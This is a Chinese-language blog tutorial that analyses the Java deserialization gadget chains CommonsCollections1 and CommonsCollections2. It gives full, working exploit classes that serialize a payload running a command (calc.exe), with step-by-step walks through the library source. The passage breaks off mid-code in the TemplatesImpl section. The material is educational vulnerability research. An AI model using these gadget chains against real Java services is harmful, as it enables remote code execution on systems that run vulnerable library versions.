---
title: 【Java反序列化】CommonsCollections链
slug: java-derivativeization-zj7e3h
url: /post/java-derivativeization-zj7e3h.html
date: '2024-09-04 01:24:26+08:00'
lastmod: '2024-10-04 02:24:39+08:00'
toc: true
tags:
  - CommonsCollections
  - Java反序列化
categories:
  - Java
keywords: CommonsCollections,Java反序列化
isCJKLanguage: true
image: >-
  https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123190803.jpg
---

# 【Java反序列化】CommonsCollections链

# Java反序列化

## 什么是序列化和反序列化

如果我们需要持久化 Java 对象比如将 Java 对象保存在文件中，或者在网络传输 Java 对象，这些场景都需要用到序列化。

* **序列化**：将数据结构或对象转换成二进制字节流的过程
* **反序列化**：将在序列化过程中所生成的二进制字节流转换成数据结构或者对象的过程

下面是序列化和反序列化常见应用场景：

* 对象在进行网络传输（比如远程方法调用 RPC 的时候）之前需要先被序列化，接收到序列化的对象之后需要再进行反序列化；
* 将对象存储到文件之前需要进行序列化，将对象从文件中读取出来需要进行反序列化；
* 将对象存储到数据库（如 Redis）之前需要用到序列化，将对象从缓存数据库中读取出来需要反序列化；
* 将对象存储到内存之前需要进行序列化，从内存中读取出来之后需要进行反序列化。

综上：**序列化的主要目的是通过网络传输对象或者说是将对象存储到文件系统、数据库、内存中。**

​![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240915163123-109rbae.png)​

## CommonsCollections1

### 版本适用范围

Commons-Collections 3.1-3.2.1

Java JDK < 8u71

### TransformerMap链

#### PoC展示

这是一段PoC，运行后会弹出一个计算器。

```java
package org.example.cc;

import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {

    public static void main(String[] args) throws Exception {
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        HashMap<Object, Object> innerMap = new HashMap();
        innerMap.put("value", "hack");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
		//触发漏洞
        onlyElement.setValue("foobar");
    }
}
```

#### PoC调用分析

先debug看看调用链，整个过程从`onlyElement.setValue("foobar")`​开始，每段代码只取相关的片段。

源码的注释需要下载[CommonsCollections源码](https://archive.apache.org/dist/commons/collections/)查看，debug时是没有的。

##### AbstractInputCheckedMapDecorator

```java
// org. apache. commons. collections. map. AbstractInputCheckedMapDecorator
 	protected abstract Object checkSetValue(Object var1);//3
    /**
     * Implementation of a map entry that checks additions via setValue.
     */
    static class MapEntry extends AbstractMapEntryDecorator {
        private final AbstractInputCheckedMapDecorator parent;

		/** The parent map */
        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
            super(entry);
            this.parent = parent;
        }

        public Object setValue(Object value) {//1
            value = this.parent.checkSetValue(value);//2
            return this.entry.setValue(value);
        }
    }
```

如代码注释里的顺序所示，程序先到AbstractInputCheckedMapDecorator的子类MapEntry，在2处调用3处的checkSetValue，但是这里的checkSetValue是抽象函数，程序运行时会根据实例调用对应的实现。

checkSetValue对应的实现有两个如下：

​![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20241125150037-fmwbr10.png)​

根据PoC的代码，这里会执行TransformMap里定义的checkSetValue。

##### TransformedMap

```java
// org. apache. commons. collections. map. TransformedMap extends AbstractInputCheckedMapDecorator
	// 
    protected final Transformer keyTransformer;
    protected final Transformer valueTransformer;
    /**
     * Factory method to create a transforming map.
     * <p>
     * If there are any elements already in the map being decorated, they
     * are NOT transformed.
     * Constrast this with {@link #decorateTransform}.
     * 
     * @param map  the map to decorate, must not be null
     * @param keyTransformer  the transformer to use for key conversion, null means no transformation
     * @param valueTransformer  the transformer to use for value conversion, null means no transformation
     * @throws IllegalArgumentException if map is null
     */
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
    /**
     * Constructor that wraps (not copies).
     */
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }
    /**
     * Override to transform the value when using <code>setValue</code>.
     * 
     * @param value  the value to transform
     * @return the transformed value
     * @since Commons Collections 3.1
     */
    protected Object checkSetValue(Object value) {//1
        return this.valueTransformer.transform(value);//2
    }
```

该类是对上文AbstractInputCheckedMapDecorator的继承，实现了checkSetValue。

该类还与PoC中`Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain)`​有关。

PoC中构造的transformers变量先到transformerChain再到outerMap，outerMap是TransformedMap类型的一个实例。

2处的transform是接口Transformer中定义的类，程序运行时会根据实例调用对应的实现。

transform对应的实现有21个如下：

​![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240908150459-4aix5gt.png)​

根据PoC中的代码，这里会运行ChainedTransformer类实现的transform。

##### ChainedTransformer

```java
// org. apache. commons. collections. functors. ChainedTransformer implements Transformer
	private final Transformer[] iTransformers;
    /**
     * Transforms the input to result via each decorated transformer
     * 
     * @param object  the input object passed to the first transformer
     * @return the transformed result
     */
    public Object transform(Object object) {//1
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);//2
        }

        return object;
    }
```

ChainedTransformer实现了Transformer接口，实现了transform。

2处的transform也是接口Transformer中定义的类，程序运行时会根据实例调用对应的实现。

transform对应的实现有21个如下：

​![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240908150459-4aix5gt.png)​

根据PoC中transformers变量的定义，该循环会先调用一次ConstantTransformer中实现的transform，再调用三次InvokerTransformer中实现的transform。

##### ConstantTransformer

```java
 // org. apache. commons. collections. functors. ConstantTransformer implements Transformer
    private final Object iConstant;

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }
    /**
     * Transforms the input by ignoring it and returning the stored constant instead.
     * 
     * @param input  the input object which is ignored
     * @return the stored constant
     */
    public Object transform(Object input) {//1
        return this.iConstant;//2
    }
```

根据PoC中`new ConstantTransformer(Runtime.class)`​，2处返回的是java.lang.Runtime。

由此可见PoC中`onlyElement.setValue("foobar")`​，值为多少都无所谓。

##### InvokerTransformer

```java
// org. apache. commons. collections. functors. InvokerTransformer
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
	/**
     * Constructor that performs no validation.
     * Use <code>getInstance</code> if you want that.
     * 
     * @param methodName  the method to call
     * @param paramTypes  the constructor parameter types, not cloned
     * @param args  the constructor arguments, not cloned
     */
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
    /**
     * Transforms the input to result by invoking a method on the input.
     * 
     * @param input  the input object to transform
     * @return the transformed result, null if null input
     */
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();//1
            Method method = cls.getMethod(iMethodName, iParamTypes);//2
            return method.invoke(input, iArgs);//3
      
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

```

此处是整个PoC的关键，关键代码是1、2、3处，这里和上面的java.lang.Runtime最终构成了Runtime.getRuntime().exec("calc.exe")。

下面重点分析此处代码。

#### PoC构造分析

##### 通过反射实现Runtime.getRuntime().exec("calc.exe")

需要了解Java反射以及forName、getMethod、invoke函数。

下面主要看下源码里对这三个函数的注释描述。

###### forName

```java
    /**
     * Returns the Class object associated with the class or interface with the given string name.
     * @param      className   the fully qualified name of the desired class.
     * @return     the Class object for the class with the specified name.  
     */
    @CallerSensitive
    public static Class<?> forName(String className)
                throws ClassNotFoundException {
        Class<?> caller = Reflection.getCallerClass();
        return forName0(className, true, ClassLoader.getClassLoader(caller), caller);
    }
```

###### getMethod

```java
    /**
     * Returns a Method object that reflects the specified public member method of the class or interface represented by this Class object.
     * The name parameter is a String specifying the simple name of the desired method.
     * The parameterTypes parameter is an array of Class objects that identify the method's formal parameter types, in declared order.
     * If parameterTypes is null, it is treated as if it were an empty array.
     * 
     * Static methods declared in superinterfaces of the class or interface
     * represented by this Class object are not considered members of
     * the class or interface.
     *
     * @param name the name of the method
     * @param parameterTypes the list of parameters
     * @return the Method object that matches the specified name and parameterTypes
     */
    @CallerSensitive
    public Method getMethod(String name, Class<?>... parameterTypes)
        throws NoSuchMethodException, SecurityException {
        checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true);
        Method method = getMethod0(name, parameterTypes, true);
        if (method == null) {
            throw new NoSuchMethodException(getName() + "." + name + argumentTypesToString(parameterTypes));
        }
        return method;
    }
```

###### invoke

```java
    /**
     * Invokes the underlying method represented by this Method
     * object, on the specified object with the specified parameters.
	 *
     * If the underlying method is static, then the specified obj argument is ignored. It may be null
	 *
     * @param obj  the object the underlying method is invoked from
     * @param args the arguments used for the method call
     * @return the result of dispatching the method represented by
     */
	@CallerSensitive
    public Object invoke(Object obj, Object... args)
        throws IllegalAccessException, IllegalArgumentException,
           InvocationTargetException
    {
        if (!override) {
            if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) {
                Class<?> caller = Reflection.getCallerClass();
                checkAccess(caller, clazz, obj, modifiers);
            }
        }
        MethodAccessor ma = methodAccessor;             // read volatile
        if (ma == null) {
            ma = acquireMethodAccessor();
        }
        return ma.invoke(obj, args);
    }
```

因此有

​`[Runtime类].getMethod([方法exec]).invoke([Runtime实例],[参数calc.exe])`​

由于Runtime的无参构造函数由private修饰，因为无法用newInstance构造，采用getRuntime方法构造。

因此有反射构造：

```java
Class.forName("java.lang.Runtime")
                .getMethod("exec", String.class)
                .invoke(
                        Class.forName("java.lang.Runtime")
                                .getMethod("getRuntime")
                                .invoke(Class.forName("java.lang.Runtime"))//此处在获取类
                        ,
                        "calc.exe"
                );
```

invoke源码中对该函数有一段特别重要的注释，单独拿出来说：

**If the underlying method is static, then the specified obj argument is ignored. It may be null**

因为getMethod是static方法，因此反射构造可以改写为：

```java
Class.forName("java.lang.Runtime")
                .getMethod("exec", String.class)
                .invoke(
                        Class.forName("java.lang.Runtime")
                                .getMethod("getRuntime")
                                .invoke(null)//此处在获取类
                        ,
                        "calc.exe"
                );
```

##### 依据反射构造ChainedTransformer

InvokerTransformer里有一段重要代码是构造的关键：

```java
Class cls = input.getClass();
Method method = cls.getMethod(iMethodName, iParamTypes);
return method.invoke(input, iArgs);
```

改造一下便是：

```java
input.getClass()
		.getMethod(iMethodName, iParamTypes)
		.invoke(input, iArgs)
```

根据该结构改造反射构造：

```java
Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).getClass()
                .getMethod("exec", String.class)
                .invoke(
                        Class.forName("java.lang.Runtime")
                                .getMethod("getRuntime")
                                .invoke(null)
                        ,
                        "calc.exe"
                );

```

即为了匹配样式，把`Class.forName("java.lang.Runtime")`​改为`Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).getClass()`​。

根据ChainedTransformer的源码可知，上一层transform的结果会是这一层transform的参数，因此有：

###### step1

```java
Object input = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)

return input.getClass()
		.getMethod("exec", String.class)
		.invoke(input, "calc.exe")

new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
```

###### step2

```java
Object input = Class.forName("java.lang.Runtime").getMethod("getRuntime")

return input.getClass()
		.getMethod("invoke", new Class[] {Object.class, Object[].class})
		.invoke(input, new Object[] {null, new Object[0]})

new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]})
```

###### step3

```java
Object input = Class.forName("java.lang.Runtime")

return input.getClass()
		.getMethod("getMethod", new Class[] {String.class, Class[].class})
		.invoke(input, new Object[] {"getRuntime", new Class[0]})

new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
```

###### step4

```java
new ConstantTransformer(Runtime.class)
```

至此PoC中的transformers构造完成

#### Exp构造分析

Exp需要对PoC进行改写，使只要服务端执行了readObject函数就等于命令执行，这样更容易触发漏洞。

```java
package org.example.cc;

import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {

    public static void main(String[] args) throws Exception {
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        HashMap<Object, Object> innerMap = new HashMap();
        innerMap.put("value", "hack");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        /*Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");*/

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object o = ctor.newInstance(SuppressWarnings.class, outerMap);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream fos = new FileOutputStream("payload.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(o);

        //服务端读取文件，反序列化，模拟网络传输
        FileInputStream fis = new FileInputStream("payload.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();

    }
}
```

和PoC相比，Exp主要增加了一个AnnotationInvocationHandler类的使用，下面主要分析一下AnnotationInvocationHandler相关代码。

##### AnnotationInvocationHandler

```java
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1;
        this.memberValues = var2;
    }

    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Map.Entry var5 = (Map.Entry)var4.next();
            String var6 = (String)var5.getKey();//1
            Class var7 = (Class)var3.get(var6);//2
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));//3
                }
            }
        }
    }
```

在源码处下断，调试程序，可以看到此处各个变量的值：

​![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240915172449-wefqila.png)​

可以看到在3处，触发了AbstractMapEntryDecorator的调用，这就与PoC调用分析中的AbstractInputCheckedMapDecorator对应上了。

在构造Exp时需要特别注意1、2处的代码。

1处代码和Exp中的`innerMap.put("value", "hack");`​有关；2处的代码和Exp中的`Object o = ctor.newInstance(SuppressWarnings.class, outerMap);`​有关。

SuppressWarnings类的代码如下：

```java
@Target({ElementType.TYPE, ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER, ElementType.CONSTRUCTOR, ElementType.LOCAL_VARIABLE})
@Retention(RetentionPolicy.SOURCE)
public @interface SuppressWarnings {
    String[] value();
}
```

可见若innerMap.put的key值不是**value**，或者SuppressWarnings类中没有**value**方法，1、2处代码就无法顺利执行。

除了SuppressWarnings类，还有Target类和Retention类，它们的代码分别如下：

```java
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.ANNOTATION_TYPE})
public @interface Target {
    ElementType[] value();
}
```

```java
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.ANNOTATION_TYPE})
public @interface Retention {
    RetentionPolicy value();
}
```

### LazyMap链

#### Exp展示

```java
package org.example.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1L {
    public static void main(String[] args) throws Exception {
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        HashMap<Object, Object> innerMap = new HashMap();
        //innerMap.put("value", "hack");
        //给予map数据转化链
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        InvocationHandler ith = (InvocationHandler) ctor.newInstance(SuppressWarnings.class, outerMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith);
        Object o = ctor.newInstance(SuppressWarnings.class, mapProxy);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream fos = new FileOutputStream("payload.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(o);

        //服务端读取文件，反序列化，模拟网络传输
        FileInputStream fis = new FileInputStream("payload.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }
}
```

‍

#### Exp构造分析

##### LazyMap

知道了TransformerMap链的原理，我们尝试逆调用链分析一下。

根据TransformerMap链的分析，我们需要再找一个类，调用了ChainedTransformer的transformer方法。

查看ChainedTransformer的transformer的调用关系，就可以看到LazyMap：

​![627bea67e99c4add810b451c1ec68a40](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/627bea67e99c4add810b451c1ec68a40-20241004012828-voem1xh.png)​

分析LazyMap源码，若key不存在，则调用Transformer的transform方法。

```java
    protected final Transformer factory;
	public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

接下来需要找那里可以调用这个get方法的地方。

##### AnnotationInvocationHandler

在TransformerMap链中分析过，AnnotationInvocationHandler的readObject方法只有调用了setValue方法，没有调用get方法。

那是否还有别的地方可以利用呢？

```java
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

	AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1;
        this.memberValues = var2;
    }

	public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else {
            assert var5.length == 0;

            if (var4.equals("toString")) {
                return this.toStringImpl();
            } else if (var4.equals("hashCode")) {
                return this.hashCodeImpl();
            } else if (var4.equals("annotationType")) {
                return this.type;
            } else {
                Object var6 = this.memberValues.get(var4);//1
                if (var6 == null) {
                    throw new IncompleteAnnotationException(this.type, var4);
                } else if (var6 instanceof ExceptionProxy) {
                    throw ((ExceptionProxy)var6).generateException();
                } else {
                    if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                        var6 = this.cloneArray(var6);
                    }

                    return var6;
                }
            }
        }
    }

    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();//2

        while(var4.hasNext()) {
            Map.Entry var5 = (Map.Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    }
```

发现invoke函数的1处，若this.memberValues是LazyMap则可以触发get函数。

那么可以利用AnnotationInvocationHandler实现了InvocationHandler，是一个动态代理类的特点，创建一个LazyMap的代理。（动态代理详见[Java动态代理](https://javaguide.cn/java/basis/proxy.html#_3-1-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6)）

即Exp中的

​`InvocationHandler ith = (InvocationHandler) ctor.newInstance(SuppressWarnings.class, outerMap)`​

​`Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith)`​

当mapProxy调用一个方法时，这个方法的调用就会被转发到实现了InvocationHandler接口类的AnnotationInvocationHandler的invoke方法来调用。

而readObject函数的2处，刚好通过mapProxy调用了entrySet方法，此时就会触发invoke函数的1处。

因此有Exp代码中的`Object o = ctor.newInstance(SuppressWarnings.class, mapProxy)`​

这样整个调用链就完成了。

ps：我们在TransformerMap链中提到了构造AnnotationInvocationHandler实例时要用SuppressWarnings类、Target类或Retention类，但LazyMap链在2处即可触发，不涉及后面的代码，因此此处任意Annotation类的继承类都可以。

## CommonsCollections2

### 版本适用范围

commons-collections4 4.0

### PriorityQueue链

#### Exp展示

commons-collections4 4.0中，LazyMap和TransformedMap没有了decorate方法，因此CommonCollections1中的利用链无法使用，需要另找别的利用链。

CommonCollections2的思路是创建一个类，在该类中构造一个包含payload的static代码块，那么JVM加载类时会执行这些静态的代码块，就会触发payload。

```java
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommomsCollections2 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
        CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime

        byte[] bytes=payload.toBytecode();//转换为byte数组

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
        field.setAccessible(true);//暴力反射
        field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组

        Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
        field1.setAccessible(true);//暴力反射
        field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test

        InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
        queue.add(1);//添加数字1插入此优先级队列
        queue.add(2);//添加数字1插入此优先级队列

        Field field2=queue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段
        field2.setAccessible(true);//暴力反射
        field2.set(queue,comparator);//设置queue的comparator字段值为comparator

        Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
        field3.setAccessible(true);//暴力反射
        field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();
    }
}
```

#### Exp构造分析

##### 利用链展示

```java
Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
```

##### InvokerTransformer

```java
// org. apache. commons. collections. functors. InvokerTransformer
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
	/**
     * Constructor that performs no validation.
     * Use <code>getInstance</code> if you want that.
     * 
     * @param methodName  the method to call
     * @param paramTypes  the constructor parameter types, not cloned
     * @param args  the constructor arguments, not cloned
     */
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
    /**
     * Transforms the input to result by invoking a method on the input.
     * 
     * @param input  the input object to transform
     * @return the transformed result, null if null input
     */
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();//1
            Method method = cls.getMethod(iMethodName, iParamTypes);//2
            return method.invoke(input, iArgs);//3
  
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

```

前文提到过，CommonCollections2的思路是构造一个恶意类，并在该类中构造一个包含payload的static代码块，那么JVM加载该类时会执行这个静态的代码块，以此触发payload。

那么注释1、2、3处就应该直接或间接实现该类的加载，或者创建类的实例的功能。

在Exp中，此处先加载了TemplatesImpl类，利用TemplatesImpl类中的方法，实例化了我们构造的恶意类。

此处，input是TemplatesImpl类的一个实例，iMethodName是newTransformer。

接下来分析其中原理。

##### TemplatesImpl

```java
    private String _name = null;
    private byte[][] _bytecodes = null;
    private Class[] _class = null;

    /**
     * Defines the translet class and auxiliary classes.
     * Returns a reference to the Class object that defines the main class
     */
    private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new HashMap<>();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);//3
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            if (_transletIndex < 0) {
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
        }
        catch (ClassFormatError e) {
